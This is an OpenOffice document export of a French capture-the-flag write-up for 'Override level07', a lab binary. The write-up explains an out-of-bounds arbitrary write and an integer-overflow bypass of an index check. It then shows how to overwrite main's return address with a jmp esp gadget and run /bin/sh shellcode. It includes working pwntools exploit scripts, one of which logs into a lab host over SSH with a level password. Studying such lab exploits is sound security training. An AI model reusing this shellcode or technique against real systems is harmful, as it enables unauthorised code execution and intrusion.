      <text:p text:style-name="P9"><text:s text:c="12"/><text:span text:style-name="T6">cmd[i]</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P5">}</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P3">Voici le code source qu'on a réussit à reconstituer. L'idée générale du programme est la suivante :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; On commence par supprimer l'intégralité des arguments en ligne de commande du programme ainsi que l'intégralité des variables d'environnement sur la stack.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; On affiche un message d'explication du programme. En gros, celui-ci alloue un <text:span text:style-name="T3">buffer[100]</text:span><text:span text:style-name="T11"> et permet d'y stocker des chiffres ainsi que de lire les chiffres qui y sont stockés.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; Pour stocker des chiffres, la fonction </text:span><text:span text:style-name="T3">store_number </text:span><text:span text:style-name="T11">est appelée dès lors que l'utilisateur entre la commande </text:span><text:span text:style-name="T3">store</text:span><text:span text:style-name="T11">. On demande un chiffre (</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T11">), un index (</text:span><text:span text:style-name="T3">n2</text:span><text:span text:style-name="T11">), puis on stock le chiffre </text:span><text:span text:style-name="T3">n </text:span><text:span text:style-name="T11">à l'index du tableau </text:span><text:span text:style-name="T3">buff[100] n2 * 4</text:span><text:span text:style-name="T11"> (on multiplie par 4 car il s'agit d'un tableau de char et on stock des unsigned int).</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Attention, certains index sont interdits : les index pour lesquels </text:span><text:span text:style-name="T3">index % 3 </text:span><text:span text:style-name="T11">est égal à 0. Certains chiffres sont interdits : les chiffres qui commencent par </text:span><text:span text:style-name="T3">0xb7</text:span><text:span text:style-name="T11">.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; La fonction </text:span><text:span text:style-name="T3">read_number </text:span><text:span text:style-name="T11">est assez simple et peu intéressante pour nous.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Au niveau de la reconstruction du code source, la seule difficulté résidait encore dans la syntaxe assembly du </text:span><text:span text:style-name="T3">modulo</text:span><text:span text:style-name="T11">, qui est toujours un peu alambiquée. Comme dans le level précédent (</text:span><text:span text:style-name="T3">Override – level06</text:span><text:span text:style-name="T11">) l'instruction </text:span><text:span text:style-name="T3">mul </text:span><text:span text:style-name="T11">est appelée et seuls les 16 upper bits sont utilisés ; on le simule par un bit shift de 32 sur un uint64_t.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">A part ça, on s'aperçoit assez vite que le programme nous offre un </text:span><text:span text:style-name="T3">arbitrary write </text:span><text:span text:style-name="T11">sur les cases mémoires qui suivent le tableau </text:span><text:span text:style-name="T3">buff[100] </text:span><text:span text:style-name="T11">en mémoire. En effet, on peut écrire des entiers aux cases mémoires </text:span><text:span text:style-name="T3">buff[n2 * 4]</text:span><text:span text:style-name="T11">, et on contrôle la variable </text:span><text:span text:style-name="T3">n2</text:span><text:span text:style-name="T11"> qui est un input utilisateur, sans qu'elle ait une limite supérieure.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">En effet, dans un débugguer sur la machine cible on voit que le </text:span><text:span text:style-name="T3">buff[100] </text:span><text:span text:style-name="T11">qui stocke nos chiffres se situe à l'adresse </text:span><text:span text:style-name="T12">0xffffd554</text:span><text:span text:style-name="T11"> ; le buffer se termine donc logiquement vers </text:span><text:span text:style-name="T12">0xffffd5b8</text:span><text:span text:style-name="T11"> (+0x64 == 100 bytes). Imaginons cependant qu'on veuille écrire dans la mémoire sur la stack </text:span><text:span text:style-name="T3">460 </text:span><text:span text:style-name="T11">bytes plus loin. On donne l'index </text:span><text:span text:style-name="T3">115</text:span><text:span text:style-name="T11">, et on voit qu'on a en effet écrit à l'adresse </text:span><text:span text:style-name="T12">0xffffd554 + 460 = 0xffffd720</text:span><text:span text:style-name="T11">, bien après la fin du tableau (on écrit le chiffre 11184810, i.e. 0xaaaaaa) :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="4.636cm" draw:z-index="0"><draw:image xlink:href="Pictures/200000070000455B000012EB93E260F7.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Puisque </text:span><text:span text:style-name="T3">buff[100] </text:span><text:span text:style-name="T11">a été déclaré dans la fonction </text:span><text:span text:style-name="T3">main</text:span><text:span text:style-name="T11">, l'idée est donc simplement d'overwrite l'adresse de retour de cette fonction main avec le mécanisme décrit ci-dessus. D'ailleurs, on se rend compte que l'adresse de retour serait écrasée avec l'offset </text:span><text:span text:style-name="T3">114</text:span><text:span text:style-name="T11"> (</text:span><text:span text:style-name="T3">buff[100] </text:span><text:span text:style-name="T11">+ 456 bytes).</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Le problème est précisément que </text:span><text:span text:style-name="T3">114 % 3 </text:span><text:span text:style-name="T11">est égal à 0, et donc qu'on ne peut inscrire cet index (on nous renverra que l'emplacement est réservé par wil). Il nous faut un moyen de contourner cette </text:span><text:soft-page-break/><text:span text:style-name="T11">sécurité.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">En gros, il faut que </text:span><text:span text:style-name="T3">n2 * 4</text:span><text:span text:style-name="T11">, lorsque considéré comme un </text:span><text:span text:style-name="T3">unsigned int</text:span><text:span text:style-name="T11">, soit égal à </text:span><text:span text:style-name="T3">114</text:span><text:span text:style-name="T11"> ; mais lui faire adopter une autre représentation binaire que celle de simplement 114 :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">00000000000000000000000001110010<text:tab/>(32 bits unsigned)</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">On peut en réalité donner un </text:span><text:span text:style-name="T3">chiffre négatif </text:span><text:span text:style-name="T11">à notre fonction scanf qui aura une représentation binaire différente, mais qui, multiplié par 4, nous donnera en tant que </text:span><text:span text:style-name="T3">unsigned int </text:span><text:span text:style-name="T11">bien la valeur </text:span><text:span text:style-name="T3">456</text:span><text:span text:style-name="T11">.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">On crée un petit programme pour nous aider à trouver ce fameux chiffre :</text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images2" text:anchor-type="paragraph" svg:x="-0.021cm" svg:y="0.275cm" svg:width="12.702cm" svg:height="6.72cm" draw:z-index="1"><draw:image xlink:href="Pictures/200000070000319D00001A41AAC87220.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Après un peu de trial and error, on trouve une valeur qui semble correspondre à ce qu'on cherche :</text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images3" text:anchor-type="paragraph" svg:x="0.058cm" svg:y="0.328cm" svg:width="6.458cm" svg:height="1.854cm" draw:z-index="2"><draw:image xlink:href="Pictures/20000007000019390000073DA5F6216A.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">On peut désormais tranquillement overwrite l'adresse de retour avec cet index qui vaut 114 mais échappe à la limitation du % 3 :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images4" text:anchor-type="paragraph" svg:x="0.12cm" svg:y="0cm" svg:width="11.178cm" svg:height="9.47cm" draw:z-index="3"><draw:image xlink:href="Pictures/2000000700002DFF000026F893B553FB.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:soft-page-break/><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">On contrôle ainsi le flux d'exécution du programme. Vers quelle adresse veut-on renvoyer ? Puisque tous nos arguments de programme et nos variables d'environnement ont été supprimées, on ne peut pas s'en servir pour accueillir notre shellcode. Mais de toutes façons, il y a ici une solution bien plus propre ; la pile est exécutable, et on a un arbitrary write.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Il suffit ainsi d'overwrite l'adresse de retour de main avec un </text:span><text:span text:style-name="T3">gadget jmp esp</text:span><text:span text:style-name="T11"> et d'écrire notre payload, 4 bytes par 4 bytes, juste après l'adresse de retour écrasée (aux index 115, 116...). Notre gadget fera revenir l'exécution précisément sur cet emplacement mémoire et exécutera notre shellcode.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Le seul truc un peu pénible est qu'il faut inscrire notre shellcode par le biais du système de stockage de chiffre, donc sous la forme d'</text:span><text:span text:style-name="T3">integers</text:span><text:span text:style-name="T11"> ; et qu'il faut faire attention à ne pas utiliser les index pour lesquels </text:span><text:span text:style-name="T13">% 3 = 0</text:span><text:span text:style-name="T11"> et les convertir en chiffres négatifs. On prend un payload avec un shellcode classique </text:span><text:span text:style-name="T3">system("/bin/sh")</text:span><text:span text:style-name="T11">, on le sépare en chiffres, puis on affiche ces chiffres en tant que </text:span><text:span text:style-name="T3">int </text:span><text:span text:style-name="T11">ainsi que les index auxquels nous devons les écrire :</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T2">from</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T5">pwn</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T2">import</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T7">*</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P13">### INFORMATIONS ###</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P13"># &gt;&gt; Overwriting return address</text:p>
      <text:p text:style-name="P13"># Index to overwrite return address : <text:s text:c="2"/>-2147483534</text:p>
      <text:p text:style-name="P13"># jmp esp gadget @ 0xf7e67610</text:p>
      <text:p text:style-name="P13"># Number to redirect to jmp esp gadget : 4158843477</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T6">a</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x6850c031</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">b</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x68732f2f</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">c</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x69622f68</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">d</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x89e3896e</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">e</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0xb0c289c1</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">f</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x3180cd0b</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">g</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x80cd40c0</text:span></text:p>
      <text:p text:style-name="P9"><text:soft-page-break/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</text:span><text:span text:style-name="T8">4158843477</text:span><text:span text:style-name="T6">)</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T9">" | Index : "</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(-</text:span><text:span text:style-name="T8">2147483534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a)</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T9">" | Index : "</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">115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b)</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T9">" | Index : "</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">116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c)</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T9">" | Index : "</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(-</text:span><text:span text:style-name="T8">2147483531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d)</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T9">" | Index : "</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">118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e)</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T9">" | Index : "</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">119</text:span><text:span text:style-name="T6">))</text:span></text:p>
      <text:p text:style-name="P9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f)</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T9">" | Index : "</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(-</text:span><text:span text:style-name="T8">2147483528</text:span><text:span text:style-name="T6">))</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T15">print</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T9">"Number : "</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(g)</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T9">" | Index : "</text:span> <text:span text:style-name="T6">+</text:span> <text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">121</text:span><text:span text:style-name="T6">))</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">On exécute :</text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images5" text:anchor-type="paragraph" svg:x="-0.009cm" svg:y="0.275cm" svg:width="13.099cm" svg:height="4.367cm" draw:z-index="4"><draw:image xlink:href="Pictures/200000070000332A0000110FB2019D01.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">Puis on entre ces valeurs une par une, ce qui, lorsqu'on appelle </text:span><text:span text:style-name="T3">quit </text:span><text:span text:style-name="T11">qui indique à la fonction </text:span><text:span text:style-name="T3">main </text:span><text:span text:style-name="T11">de </text:span><text:span text:style-name="T3">return</text:span><text:span text:style-name="T11">, nous donne bien une shell :</text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr2" draw:name="images6" text:anchor-type="paragraph" svg:x="0.018cm" svg:y="0.196cm" svg:width="10.612cm" svg:height="6.72cm" draw:z-index="5"><draw:image xlink:href="Pictures/200000070000297300001A41D6DFDFF4.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt;&gt; </text:span><text:span text:style-name="T14">Exploitation manuelle</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; Utiliser </text:span><text:span text:style-name="T3">exploit.py </text:span><text:span text:style-name="T11">afin de générer les nombres et les indexes correspondants.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; Exécuter </text:span><text:span text:style-name="T3">level07 </text:span><text:span text:style-name="T11">sur la machine cible.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; Entrer les nombres et indexes correspondants 1 par 1.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T11">&gt; Entrer </text:span><text:span text:style-name="T3">quit</text:span><text:span text:style-name="T11">.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oft-page-break/><text:span text:style-name="T11">&gt;&gt; </text:span><text:span text:style-name="T14">Exploit automatique</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11"/></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T2">from</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T5">pwn</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T2">import</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T7">*</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T6">a</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x6850c031</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">b</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x68732f2f</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">c</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x69622f68</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">d</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x89e3896e</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">e</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0xb0c289c1</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">f</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x3180cd0b</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">g</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T8">0x80cd40c0</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T6">s</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">ssh(host=</text:span><text:span text:style-name="T9">"192.168.1.3"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">port=</text:span><text:span text:style-name="T8">4242</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">user=</text:span><text:span text:style-name="T9">"level07"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">password=</text:span><text:span text:style-name="T9">"GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8"</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">s.process(</text:span><text:span text:style-name="T9">"/home/users/level07/./level07"</text:span><text:span text:style-name="T6">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</text:span><text:span text:style-name="T8">4158843477</text:span><text:span text:style-name="T6">).encode())</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p.sendline(</text:span><text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(-</text:span><text:span text:style-name="T8">2147483534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a).encode())</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p.sendline(</text:span><text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">115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b).encode())</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p.sendline(</text:span><text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">116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c).encode())</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p.sendline(</text:span><text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(-</text:span><text:span text:style-name="T8">2147483531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d).encode())</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p.sendline(</text:span><text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">118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e).encode())</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p.sendline(</text:span><text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">119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f).encode())</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p.sendline(</text:span><text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(-</text:span><text:span text:style-name="T8">2147483528</text:span><text:span text:style-name="T6">).encode())</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p.sendline(b</text:span><text:span text:style-name="T9">'store'</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p.sendline(</text:span><text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(g).encode())</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p.sendline(</text:span><text:span text:style-name="T15">str</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">121</text:span><text:span text:style-name="T6">).encode())</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p.sendline(b</text:span><text:span text:style-name="T9">'quit'</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P6"><text:span text:style-name="T6">p.interactiv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34S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2021-12-10T12:24:12.50</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="6" meta:object-count="0" meta:page-count="8" meta:paragraph-count="213" meta:word-count="1520" meta:character-count="9906"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>